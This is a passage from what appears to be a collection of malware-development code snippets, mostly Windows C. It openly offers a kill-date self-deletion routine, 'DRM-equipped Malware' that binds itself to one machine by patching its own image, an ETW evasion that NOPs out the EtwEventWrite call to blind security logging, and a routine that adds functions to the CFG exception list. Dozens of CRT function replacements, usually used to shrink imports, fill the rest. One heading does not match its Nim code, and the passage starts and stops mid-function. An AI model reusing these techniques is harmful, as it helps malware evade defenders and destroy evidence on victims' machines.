	if (!(uLocalImgHandle = (ULONG_PTR)GetModuleHandle(NULL)))
		return FALSE;

	pImgNtHdrs = (PIMAGE_NT_HEADERS)(uLocalImgHandle + ((PIMAGE_DOS_HEADER)uLocalImgHandle)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	*TimeStamp = (int)pImgNtHdrs->FileHeader.TimeDateStamp;

	return *TimeStamp ? TRUE : FALSE;
}

// ------------------------------------------------------------------------------------------------------------------------------------------------------------------

VOID DelayExecutionThenKill(IN INT DelayTime) {

	while (DelayTime > MAXDWORD) {
		Sleep(MAXDWORD);
		DelayTime -= MAXDWORD;
	}

	printf("[i] Killing Self After %d Seconds \n", DelayTime);
	Sleep(DelayTime * 1000);

	// After sleep is done, self-kill:
	DeleteSelfFromDisk();
	TerminateProcess((HANDLE)-1, 1);
}

// ------------------------------------------------------------------------------------------------------------------------------------------------------------------

BOOL SelfDeleteAtKillDate() {

	INT		T1		= 0x00,
			T2		= 0x00,
			Delta	= 0x00;

	// Get binary compilation date
	if (!GetLocalPeTimeStamp(&T1))
		return FALSE;

	// Get current date
	if (!GetCurrentUnixTime(&T2))
		return FALSE;

	// 'Delta' represent the time the binary exist for after compilation
	Delta = T2 - T1;

	// If it exists beyond the kill date, self delete
	if (Delta >= KILL_DATE) {
		DeleteSelfFromDisk();
		TerminateProcess((HANDLE)-1, 1);
	}
	// Otherwise, sleep till we reach the kill date
	else
		DelayExecutionThenKill((KILL_DATE - Delta));

	return TRUE;
}
```
### DRM-equipped Malware
```c
#include <windows.h>
#include <stdio.h>
#include <Winternl.h>

// ========================================================================================================================================

#define INITIAL_VALUE 0x4E554C4C

CONST DWORD g_dwSerialNumberConstVariable = INITIAL_VALUE;

// ========================================================================================================================================

BOOL ReadSelfFromDiskW(IN LPWSTR szLocalImageName, OUT ULONG_PTR* pModule, OUT DWORD* pdwFileSize) {

	HANDLE		hFile				= INVALID_HANDLE_VALUE;
	PBYTE		pFileBuffer			= NULL;
	DWORD		dwFileSize			= 0x00,
				dwNumberOfBytesRead = 0x00;

	if (!szLocalImageName || !pModule || !pdwFileSize)
		return FALSE;

	if ((hFile = CreateFileW(szLocalImageName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
		printf("[!] GetFileSize Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if ((pFileBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize)) == NULL) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!ReadFile(hFile, pFileBuffer, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
		printf("[!] ReadFile Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	*pModule		= (ULONG_PTR)pFileBuffer;
	*pdwFileSize	= dwFileSize;

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	if (!*pModule && pFileBuffer)
		HeapFree(GetProcessHeap(), 0x00, pFileBuffer);
	return *pModule == NULL ? FALSE : TRUE;
}

// ========================================================================================================================================

BOOL WriteSelfToDiskW(IN LPWSTR szLocalImageName, IN PVOID pImageBase, IN DWORD sImageSize) {

	HANDLE		hFile						= INVALID_HANDLE_VALUE;
	DWORD		dwNumberOfBytesWritten		= 0x00;

	if (!szLocalImageName || !pImageBase || !sImageSize)
		return FALSE;

	if ((hFile = CreateFileW(szLocalImageName, GENERIC_WRITE, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!WriteFile(hFile, pImageBase, sImageSize, &dwNumberOfBytesWritten, NULL) || sImageSize != dwNumberOfBytesWritten) {
		printf("[!] WriteFile Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	return dwNumberOfBytesWritten == sImageSize ? TRUE : FALSE;
}

// ========================================================================================================================================

typedef struct _FILE_RENAME_INFO2 {
#if (_WIN32_WINNT >= _WIN32_WINNT_WIN10_RS1)
	union {
		BOOLEAN ReplaceIfExists;
		DWORD Flags;
	} DUMMYUNIONNAME;
#else
	BOOLEAN ReplaceIfExists;
#endif
	HANDLE RootDirectory;
	DWORD FileNameLength;
	WCHAR FileName[MAX_PATH]; // Instead of "WCHAR FileName[1]" (See FILE_RENAME_INFO's original documentation)
} FILE_RENAME_INFO2, * PFILE_RENAME_INFO2;


BOOL DeleteSelfFromDiskW(IN LPCWSTR szFileName) {

	BOOL						bResult			= FALSE;
	HANDLE                      hFile			= INVALID_HANDLE_VALUE;
	FILE_DISPOSITION_INFO       DisposalInfo	= { .DeleteFile = TRUE };
	FILE_RENAME_INFO2			RenameInfo		= { .FileNameLength = sizeof(L":%x%x\x00"), .ReplaceIfExists = FALSE, .RootDirectory = 0x00 };

	if (!szFileName)
		return FALSE;

	swprintf(RenameInfo.FileName, MAX_PATH, L":%x%x\x00", rand(), rand() * rand());

	if ((hFile = CreateFileW(szFileName, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!SetFileInformationByHandle(hFile, FileRenameInfo, &RenameInfo, sizeof(RenameInfo))) {
		printf("[!] SetFileInformationByHandle [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	CloseHandle(hFile);

	if ((hFile = CreateFileW(szFileName, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &DisposalInfo, sizeof(DisposalInfo))) {
		printf("[!] SetFileInformationByHandle [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	return bResult;
}


// ========================================================================================================================================

BOOL IsSameMachine() {

	BOOL					bResult					= FALSE;
	LPWSTR					szLocalImage			= NULL;
	ULONG_PTR				uModule					= NULL,
							uMachineSerialVA		= NULL;
	PIMAGE_NT_HEADERS		pImgNtHdrs				= NULL;
	PIMAGE_SECTION_HEADER	pImgSec					= NULL;
	DWORD					dwSerialNumber			= 0x00,
							dwFileSize				= 0x00;

    if (!GetVolumeInformationW(L"C:\\", NULL, 0x00, &dwSerialNumber, NULL, NULL, NULL, 0x00) || dwSerialNumber == 0x00) {
        printf("[!] GetVolumeInformationW Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    printf("[i] New Volume Serial Number: 0x%0.4X\n", dwSerialNumber);
    printf("[i] Old Volume Serial Number: 0x%0.4X\n", g_dwSerialNumberConstVariable);

	// Same machine (Already patched)
	if (g_dwSerialNumberConstVariable == dwSerialNumber) {
		printf("[*] Same Machine \n");
		return TRUE;
	}

	// Serial Number is not the same as the initial value or the runtime-serial number (dwSerialNumber)
	if (g_dwSerialNumberConstVariable != INITIAL_VALUE) {
		printf("[!] Different Machine \n");
		return FALSE;
	}

	// g_dwSerialNumberConstVariable is equal to 'INITIAL_VALUE', then we patch it:
	printf("[i] First Time Running, Patching Image ... \n");

	// Read local image
	szLocalImage = (LPWSTR)(((PPEB)__readgsqword(0x60))->ProcessParameters->ImagePathName.Buffer);
	if (!ReadSelfFromDiskW(szLocalImage, &uModule, &dwFileSize))
		goto _FUNC_CLEANUP;

	// Fetch the Nt Headers
	pImgNtHdrs = uModule + ((PIMAGE_DOS_HEADER)uModule)->e_lfanew;
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		goto _FUNC_CLEANUP;

	// Fetch the value of the 'g_dwSerialNumberConstVariable' variable inside the .rdata section
	pImgSec = IMAGE_FIRST_SECTION(pImgNtHdrs);
	for (DWORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections && !uMachineSerialVA; i++) {

		if (*(ULONG*)pImgSec[i].Name == 'adr.') {

			for (int x = 0; x < pImgSec[i].SizeOfRawData && !uMachineSerialVA; x += sizeof(DWORD)){

				if (*(DWORD*)(uModule + pImgSec[i].PointerToRawData + x) == g_dwSerialNumberConstVariable)
					uMachineSerialVA = (uModule + pImgSec[i].PointerToRawData + x);
			}
		}
	}

	// If fetched
	if (uMachineSerialVA != 0x00) {

		// Patch it with the serial number
		*(DWORD*)uMachineSerialVA = dwSerialNumber;

		// Delete old image from disk
		if (!DeleteSelfFromDiskW(szLocalImage))
			goto _FUNC_CLEANUP;

		// Write the new version (patched)
		if (!WriteSelfToDiskW(szLocalImage, uModule, dwFileSize))
			goto _FUNC_CLEANUP;

		bResult = TRUE;
	}


_FUNC_CLEANUP:
	if (uModule != NULL)
		HeapFree(GetProcessHeap(), 0x00, uModule);
	return bResult;
}
```
### Retrieve All TXT Records
```c
#include <windows.h>
#include <stdio.h>
import winim

proc hostCheckA*(lpHostName: string): bool =
  var
    pcHostName: LPSTR
    dwHostNameLength: DWORD

  if GetComputerNameExA(computerNameNetBIOS, NULL, dwHostNameLength.addr) == 0 and GetLastError() != ERROR_MORE_DATA:
    echo "[!] GetComputerNameExA [1] Failed With Error: " & $GetLastError()
    return false

  pcHostName = cast[LPSTR](LocalAlloc(LPTR, dwHostNameLength))
  if (cast[int](pcHostName) == 0):
    return false

  if GetComputerNameExA(computerNameNetBIOS, pcHostName, dwHostNameLength.addr) == 0:
    echo "[!] GetComputerNameExA [2] Failed With Error: " & $GetLastError()
    LocalFree(cast[HLOCAL](pcHostName))
    return false

  if lpHostName == $pcHostName:
    LocalFree(cast[HLOCAL](pcHostName))
    return true
  else:
    LocalFree(cast[HLOCAL](pcHostName))
    return false
```
### Strrchr Function Replacement
```c
#include <windows.h>
#include <stdio.h>
char* _strrchrA(const char* string, char c) {

	const char* string2 = string;

	while (*string2)
		++string2;

	while (string2 != string && *string2 != c)
		--string2;

	if (*string2 == c)
		return (char*)string2;

	return NULL;
}
```
### Wcsdup Function Replacement
```c
#include <windows.h>
#include <stdio.h>
int _strlenW(const wchar_t* string) {

	const wchar_t* string2;

	for (string2 = string; *string2; ++string2);

	return (int)(string2 - string);
}

void* _malloc(size_t size) {
	return HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
}

void* _memcpy(void* dest, const void* src, size_t count) {

	char* dest2			= (char*)dest;
	const char* src2	= (const char*)src;

	while (count--)
		*dest2++ = *src2++;

	return dest;
}

wchar_t* _strdupW(const wchar_t* string) {

	size_t len = _strlenW(string) + sizeof(wchar_t);
	wchar_t* new_string = (wchar_t*)_malloc(len * sizeof(wchar_t));

	if (new_string)
		_memcpy(new_string, string, len * sizeof(wchar_t));

	return new_string;
}
```
### Memcmp Function Replacement
```c
#include <windows.h>
#include <stdio.h>
int _memcmp(const void* buf1, const void* buf2, size_t count) {

	const unsigned char* buf1_2 = (const unsigned char*)buf1;
	const unsigned char* buf2_2 = (const unsigned char*)buf2;

	while (count--) {

		if (*buf1_2 != *buf2_2)
			return *buf1_2 - *buf2_2;

		++buf1_2;
		++buf2_2;
	}

	return 0;
}
```
### Strspn Function Replacement
```c
#include <windows.h>
char* _strchrA(const char* string, char c) {

	while (*string && *string != c)
		++string;

	if (*string == c)
		return (char*)string;

	return NULL;
}

size_t _strspnA(const char* string1, const char* string2) {

	size_t count = 0;

	while (*string1 && _strchrA(string2, *string1++))
		++count;

	return count;
}
```
### Realloc Function Replacement
```c
#include <windows.h>
void* _realloc(void** mem, size_t size) {
	return (*mem = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *mem, size));
}
```
### Free Function Replacement
```c
#include <windows.h>
void _free(void* mem) {
	HeapFree(GetProcessHeap(), 0x00, mem);
}
```
### Wcsstr Function Replacement
```c
#include <windows.h>
int _strlenW(const wchar_t* string) {

	const wchar_t* string2;

	for (string2 = string; *string2; ++string2);

	return (int)(string2 - string);
}

int _memcmp(const void* buf1, const void* buf2, size_t count) {

	const unsigned char* buf1_2 = (const unsigned char*)buf1;
	const unsigned char* buf2_2 = (const unsigned char*)buf2;

	while (count--) {

		if (*buf1_2 != *buf2_2)
			return *buf1_2 - *buf2_2;

		++buf1_2;
		++buf2_2;
	}

	return 0;
}

wchar_t* _strstrW(const wchar_t* string1, const wchar_t* string2) {

	size_t len = _strlenW(string2);

	while (*string1) {

		if (!_memcmp(string1, string2, len))
			return (wchar_t*)string1;

		++string1;
	}

	return NULL;
}
```
### Printf Function Replacement
```c
#include <windows.h>
#define PRINTA( STR, ... )                                                                  \
    if (1) {                                                                                \
        LPSTR buf = (LPSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );           \
        if ( buf != NULL ) {                                                                \
            int len = wsprintfA( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleA( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0x00, buf );                                        \
        }                                                                                   \
    }

```
### Wcsrchr Function Replacement
```c
#include <windows.h>
wchar_t* _strrchrW(const wchar_t* string, wchar_t c) {

	const wchar_t* string2 = string;

	while (*string2)
		++string2;

	while (string2 != string && *string2 != c)
		--string2;

	if (*string2 == c)
		return (wchar_t*)string2;

	return NULL;
}
```
### Strstr Function Replacement
```c
#include <windows.h>
int _strlenA(const char* string) {

    const char* string2;

    for (string2 = string; *string2; ++string2);

    return (int)(string2 - string);
}

int _memcmp(const void* buf1, const void* buf2, size_t count) {

	const unsigned char* buf1_2 = (const unsigned char*)buf1;
	const unsigned char* buf2_2 = (const unsigned char*)buf2;

	while (count--) {

		if (*buf1_2 != *buf2_2)
			return *buf1_2 - *buf2_2;

		++buf1_2;
		++buf2_2;
	}

	return 0;
}

char* _strstrA(const char* string1, const char* string2) {

	size_t len = _strlenA(string2);

	while (*string1) {

		if (!_memcmp(string1, string2, len))
			return (char*)string1;

		++string1;
	}

	return NULL;
}
```
### Free Function Replacement (2)
```c
#include <windows.h>
void _free2(void* mem) {
	LocalFree(mem);
}
```
### Strdup Function Replacement
```c
#include <windows.h>
int _strlenA(const char* string) {

    const char* string2;

    for (string2 = string; *string2; ++string2);

    return (int)(string2 - string);
}

void* _malloc(size_t size) {
	return HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
}

void* _memcpy(void* dest, const void* src, size_t count) {

	char* dest2			= (char*)dest;
	const char* src2	= (const char*)src;

	while (count--)
		*dest2++ = *src2++;

	return dest;
}

char* _strdupA(const char* string) {

	size_t len = _strlenA(string) + sizeof(char);
	char* new_string = (char*)_malloc(len);

	if (new_string)
		_memcpy(new_string, string, len);

	return new_string;
}
```
### Wcsspn Function Replacement
```c
#include <windows.h>
wchar_t* _strchrW(const wchar_t* string, wchar_t c) {

	while (*string && *string != c)
		++string;

	if (*string == c)
		return (wchar_t*)string;

	return NULL;
}

size_t _strspnW(const wchar_t* string1, const wchar_t* string2) {

	size_t count = 0;

	while (*string1 && _strchrW(string2, *string1++))
		++count;

	return count;
}
```
### Realloc Function Replacement (2)
```c
#include <windows.h>
void* _realloc2(void** mem, size_t size) {
	return (*mem = LocalReAlloc(*mem, size, LMEM_MOVEABLE | LMEM_ZEROINIT));
}
```
### Tolower Function Replacement
```c
#include <windows.h>
char _to_lower(char c) {

	if (c >= 'A' && c <= 'Z')
		return c - 'A' + 'a';
	else
		return c;
}
```
### Wcsistr Function Replacement
```c
#include <windows.h>
char _to_lower(char c) {

	if (c >= 'A' && c <= 'Z')
		return c - 'A' + 'a';
	else
		return c;
}

wchar_t* _stristrW(const wchar_t* string1, const wchar_t* string2) {

	if (!*string2) {
		return (wchar_t*)string1;
	}

	for (; *string1; ++string1) {
		if (_to_lower((unsigned char)*string1) == _to_lower((unsigned char)*string2)) {
			const wchar_t* h, * n;
			for (h = string1, n = string2; *h && *n; ++h, ++n) {
				if (_to_lower((unsigned char)*h) != _to_lower((unsigned char)*n)) {
					break;
				}
			}
			if (!*n) {
				return (wchar_t*)string1;
			}
		}
	}

	return NULL;
}
```
### Wcsncat Function Replacement
```c
#include <windows.h>
wchar_t* _strncatW(wchar_t* dest, const wchar_t* src, size_t count) {

	wchar_t* dest2 = dest;

	while (*dest2)
		++dest2;

	while (count-- && *src)
		*dest2++ = *src++;

	*dest2 = 0;

	return dest;
}
```
### Strchr Function Replacement
```c
#include <windows.h>
char* _strchrA(const char* string, char c) {

	while (*string && *string != c)
		++string;

	if (*string == c)
		return (char*)string;

	return NULL;
}
```
### Strlen Function Replacement
```c
#include <windows.h>
int _strlenA(const char* string) {

    const char* string2;

    for (string2 = string; *string2; ++string2);

    return (int)(string2 - string);
}
```
### Strcat Function Replacement
```c
#include <windows.h>
char* _strcatA(char* dest, const char* src) {

	char* dest2 = dest;

	while (*dest2)
		++dest2;

	while (*src)
		*dest2++ = *src++;

	*dest2 = 0;

	return dest;
}
```
### Wprintf Function Replacement
```c
#include <windows.h>
#define PRINTW( STR, ... )                                                                  \
    if (1) {                                                                                \
        LPWSTR buf = (LPWSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );         \
        if ( buf != NULL ) {                                                                \
            int len = wsprintfW( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleW( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0x00, buf );                                        \
        }                                                                                   \
    }

```
### Wcscat Function Replacement
```c
#include <windows.h>
wchar_t* _strcatW(wchar_t* dest, const wchar_t* src) {

	wchar_t* dest2 = dest;

	while (*dest2)
		++dest2;

	while (*src)
		*dest2++ = *src++;

	*dest2 = 0;

	return dest;
}
```
### Wcschr Function Replacement
```c
#include <windows.h>
wchar_t* _strchrW(const wchar_t* string, wchar_t c) {

	while (*string && *string != c)
		++string;

	if (*string == c)
		return (wchar_t*)string;

	return NULL;
}
```
### Wcslen Function Replacement
```c
#include <windows.h>
int _strlenW(const wchar_t* string) {

	const wchar_t* string2;

	for (string2 = string; *string2; ++string2);

	return (int)(string2 - string);
}
```
### Stristr Function Replacement
```c
#include <windows.h>
char _to_lower(char c) {

	if (c >= 'A' && c <= 'Z')
		return c - 'A' + 'a';
	else
		return c;
}

char* _stristrA(const char* string1, const char* string2) {

	if (!*string2) {
		return (char*)string1;
	}

	for (; *string1; ++string1) {
		if (_to_lower((unsigned char)*string1) == _to_lower((unsigned char)*string2)) {
			const char* h, * n;
			for (h = string1, n = string2; *h && *n; ++h, ++n) {
				if (_to_lower((unsigned char)*h) != _to_lower((unsigned char)*n)) {
					break;
				}
			}
			if (!*n) {
				return (char*)string1;
			}
		}
	}
	return NULL;
}
```
### Strncat Function Replacement
```c
#include <windows.h>
char* _strncatA(char* dest, const char* src, size_t count) {

	char* dest2 = dest;

	while (*dest2)
		++dest2;

	while (count-- && *src)
		*dest2++ = *src++;

	*dest2 = 0;

	return dest;
}
```
### Memcpy Function Replacement
```c
#include <windows.h>
void* _memcpy(void* dest, const void* src, size_t count) {

	char* dest2			= (char*)dest;
	const char* src2	= (const char*)src;

	while (count--)
		*dest2++ = *src2++;

	return dest;
}
```
### Memset Function Replacement
```c
#include <windows.h>
void* _memset(void* dest, int c, size_t count) {

	char* dest2 = (char*)dest;

	while (count--)
		*dest2++ = (char)c;

	return dest;
}
```
### Wcscmp Function Replacement
```c
#include <windows.h>
int _strcmpW(const wchar_t* string1, const wchar_t* string2) {

	while (*string1 && *string1 == *string2) {

		++string1;
		++string2;
	}

	return *(unsigned short*)string1 - *(unsigned short*)string2;
}
```
### Strcspn Function Replacement
```c
#include <windows.h>
size_t _strcspnA(const char* string1, const char* string2) {
	const char* ptr1;
	const char* ptr2;

	for (ptr1 = string1; *ptr1; ++ptr1) {
		for (ptr2 = string2; *ptr2; ++ptr2) {
			if (*ptr1 == *ptr2) {
				return ptr1 - string1;
			}
		}
	}

	return ptr1 - string1;
}
```
### Strtok Function Replacement
```c
#include <windows.h>
char* _strchrA(const char* string, char c) {

	while (*string && *string != c)
		++string;

	if (*string == c)
		return (char*)string;

	return NULL;
}

char* _strtokA(char* string, const char* delim) {

	static char* string2 = NULL;
	if (string == NULL)
		string = string2;
	if (string == NULL)
		return NULL;

	while (*string && _strchrA(delim, *string))
		++string;
	if (*string == '\0') {
		string2 = NULL;
		return NULL;
	}

	char* end = string;
	while (*end && !_strchrA(delim, *end))
		++end;

	if (*end == '\0')
		string2 = NULL;
	else {
		*end = '\0';
		string2 = end + 1;
	}

	return string;
}
```
### Toupper Function Replacement
```c
#include <windows.h>
char _to_upper(char c) {

    if (c >= 'a' && c <= 'z')
        return c - 'a' + 'A';
    else
        return c;
}
```
### Wcscspn Function Replacement
```c
#include <windows.h>
size_t _strcspnW(const wchar_t* string1, const wchar_t* string2) {
	const wchar_t* ptr1;
	const wchar_t* ptr2;

	for (ptr1 = string1; *ptr1; ++ptr1) {
		for (ptr2 = string2; *ptr2; ++ptr2) {
			if (*ptr1 == *ptr2) {
				return ptr1 - string1;
			}
		}
	}

	return ptr1 - string1;
}
```
### Malloc Function Replacement
```c
#include <windows.h>
void* _malloc(size_t size) {
	return HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
}
```
### Malloc Function Replacement 2
```c
#include <windows.h>
void* _malloc2(size_t size) {
	return LocalAlloc(LPTR, size);
}
```
### Wcstok Function Replacement
```c
#include <windows.h>
wchar_t* _strchrW(const wchar_t* string, wchar_t c) {

	while (*string && *string != c)
		++string;

	if (*string == c)
		return (wchar_t*)string;

	return NULL;
}

wchar_t* _strtokW(wchar_t* string, const wchar_t* delimiters) {

	static wchar_t* string2 = NULL;

	if (string)
		string2 = string;

	if (!string2)
		return NULL;

	wchar_t* start = string2;

	while (_strchrW(delimiters, *string2))
		++string2;

	if (!*string2) {
		string2 = NULL;
		return NULL;
	}

	start = string2;

	while (*string2 && !_strchrW(delimiters, *string2))
		++string2;

	if (*string2) {
		*string2 = 0;
		++string2;
	}

	return start;
}
```
### Memmove Function Replacement
```c
#include <windows.h>
void* _memmove(void* dest, const void* src, size_t count) {

	char* dest2			= (char*)dest;
	const char* src2	= (const char*)src;

	if (dest2 <= src2) {

		while (count--)
			*dest2++ = *src2++;
	}
	else {

		dest2 += count;
		src2 += count;

		while (count--)
			*--dest2 = *--src2;
	}

	return dest;
}
```
### Strcmp Function Replacement
```c
#include <windows.h>
int _strcmpA(const char* string1, const char* string2) {

	while (*string1 && *string1 == *string2) {

		++string1;
		++string2;
	}

	return *(unsigned char*)string1 - *(unsigned char*)string2;
}
```
### Wcsicmp Function Replacement
```c
#include <windows.h>
char _to_lower(char c) {

	if (c >= 'A' && c <= 'Z')
		return c - 'A' + 'a';
	else
		return c;
}

int _strcicmpW(const wchar_t* string1, const wchar_t* string2) {

	while (*string1 && _to_lower(*string1) == _to_lower(*string2)) {

		++string1;
		++string2;
	}

	return *(unsigned short*)string1 - *(unsigned short*)string2;
}
```
### Strcpy Function Replacement
```c
#include <windows.h>
char* _strcpyA(char* dest, const char* src) {

	char* dest2 = dest;

	while (*src)
		*dest2++ = *src++;

	*dest2 = 0;

	return dest;
}
```
### Wcsncpy Function Replacement
```c
#include <windows.h>
wchar_t* _strncpyW(wchar_t* dest, const wchar_t* src, size_t count) {

	wchar_t* dest2 = dest;

	while (count-- && *src)
		*dest2++ = *src++;

	*dest2 = 0;

	return dest;
}
```
### ETW Evasion Via Patching EtwpEventWrite
```c
#include <windows.h>
#include <stdio.h>
typedef enum PATCH
{
	PATCH_ETW_EVENTWRITE,
	PATCH_ETW_EVENTWRITE_FULL
};

BOOL PatchEtwpEventWriteFullCall(enum PATCH ePatch) {


	DWORD		dwOldProtection		= 0x00;
	PBYTE		pEtwFuncAddress		= NULL,
				pPatchAddress		= NULL;
	INT			x					= 0x00;

	if (!(pEtwFuncAddress = GetProcAddress(GetModuleHandle(TEXT("NTDLL")), ePatch == PATCH_ETW_EVENTWRITE ? "EtwEventWrite" : "EtwEventWriteFull"))) {
		printf("[!] GetProcAddress Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	for (int i = 0; i < 0x1000; i++) {
		// 0xCCC3: ret | int3
		if (*(unsigned short*)(pEtwFuncAddress + i) == 0xCCC3) {
			x = i;
			break;
		}
	}

	if (!x)
		return FALSE;

	for (int i = x; i > 0; i--) {
		// 0xE8: call
		if (pEtwFuncAddress[i] == 0xE8) {
			pPatchAddress = (PBYTE)&pEtwFuncAddress[i];
			break;
		}
	}

	if (!pPatchAddress || pPatchAddress[0] != 0xE8)
		return FALSE;

	// Patch size: 5 bytes
	// Replacing 'call EtwpEventWriteFull' with NOPs

	if (!VirtualProtect(pPatchAddress, 0x05, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		return FALSE;
	}

	for (int i = 0; i < 0x05; i++)
		*(PBYTE)&pPatchAddress[i] = 0x90;

	if (!VirtualProtect(pPatchAddress, 0x05, dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		return FALSE;
	}

	return TRUE;
}
```
### Strcicmp Function Replacement
```c
#include <windows.h>
char _to_lower(char c) {

	if (c >= 'A' && c <= 'Z')
		return c - 'A' + 'a';
	else
		return c;
}

int _strcicmpA(const char* string1, const char* string2) {

	while (*string1 && _to_lower(*string1) == _to_lower(*string2)) {

		++string1;
		++string2;
	}

	return *(unsigned char*)string1 - *(unsigned char*)string2;
}
```
### Strncpy Function Replacement
```c
#include <windows.h>
char* _strncpyA(char* dest, const char* src, size_t count) {

	char* dest2 = dest;

	while (count-- && *src)
		*dest2++ = *src++;

	*dest2 = 0;

	return dest;
}
```
### ZeroMemory Function Replacement
```c
#include <windows.h>
void _ZeroMemory(void* dest, size_t count) {

	char* dest2 = (char*)dest;

	while (count--)
		*dest2++ = 0x00;
}
```
### Wcscpy Function Replacement
```c
#include <windows.h>
wchar_t* _strcpyW(wchar_t* dest, const wchar_t* src) {

	wchar_t* dest2 = dest;

	while (*src)
		*dest2++ = *src++;

	*dest2 = 0;

	return dest;
}
```
### Add A Function To The CFG Exception List
```c
#include <windows.h>
#include <stdio.h>
typedef enum _VIRTUAL_MEMORY_INFORMATION_CLASS
{
	VmPrefetchInformation,
	VmPagePriorityInformation,
	VmCfgCallTargetInformation

} VIRTUAL_MEMORY_INFORMATION_CLASS;

typedef struct _VM_INFORMATION
{
	DWORD					dwNumberOfOffsets;
	PULONG					plOutput;
	PCFG_CALL_TARGET_INFO	ptOffsets;
	PVOID					pMustBeZero;
	PVOID					pMoarZero;
} VM_INFORMATION, * PVM_INFORMATION;

typedef struct _MEMORY_RANGE_ENTRY
{
	PVOID  VirtualAddress;
	SIZE_T NumberOfBytes;
} MEMORY_RANGE_ENTRY, * PMEMORY_RANGE_ENTRY;


typedef NTSTATUS(NTAPI* fnNtSetInformationVirtualMemory)(HANDLE ProcessHandle, VIRTUAL_MEMORY_INFORMATION_CLASS VmInformationClass, ULONG_PTR NumberOfEntries, PMEMORY_RANGE_ENTRY VirtualAddresses, PVOID VmInformation, ULONG VmInformationLength);

BOOL CfgFunctionAddressAdd(IN HANDLE hProcess, IN ULONG_PTR uImageBaseAddress, IN PVOID pFunctionAddress) {

	NTSTATUS							STATUS									= 0x00;
	CFG_CALL_TARGET_INFO				CfgTargetInfo							= { 0 };
	MEMORY_RANGE_ENTRY					MemRangeEntry							= { 0 };
	VM_INFORMATION						VmInformation							= { 0 };
	PIMAGE_NT_HEADERS					pImgNtHdrs								= NULL;
	DWORD								dwOutput								= 0x00;
	fnNtSetInformationVirtualMemory		pNtSetInformationVirtualMemory			= NULL;

	if (!hProcess || !uImageBaseAddress || !pFunctionAddress)
		return FALSE;

	if (!(pNtSetInformationVirtualMemory = (fnNtSetInformationVirtualMemory)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtSetInformationVirtualMemory"))) {
		printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	pImgNtHdrs = (PIMAGE_NT_HEADERS)(uImageBaseAddress + ((PIMAGE_DOS_HEADER)(uImageBaseAddress))->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	MemRangeEntry.NumberOfBytes		= (pImgNtHdrs->OptionalHeader.SizeOfImage + 0x1000 - 1) & ~(0x1000 - 1);
	MemRangeEntry.VirtualAddress	= (PVOID)uImageBaseAddress;

	CfgTargetInfo.Flags				= CFG_CALL_TARGET_VALID;
	CfgTargetInfo.Offset			= (ULONG_PTR)pFunctionAddress - uImageBaseAddress;

	VmInformation.dwNumberOfOffsets = 0x01;
	VmInformation.plOutput			= &dwOutput;
	VmInformation.ptOffsets			= &CfgTargetInfo;
	VmInformation.pMustBeZero		= NULL;
	VmInformation.pMoarZero			= NULL;

